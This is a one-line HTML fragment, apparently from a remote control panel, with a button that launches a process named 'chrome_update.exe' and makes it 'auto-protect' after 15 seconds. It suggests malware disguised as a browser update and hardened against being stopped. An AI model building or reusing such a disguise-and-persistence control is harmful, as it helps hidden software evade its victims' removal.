...
<button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('PROTECT_PROCESS')">🔒 Spawn Protected Copy <span>Launch chrome_update.exe (auto-protects in 15s)</span></button>
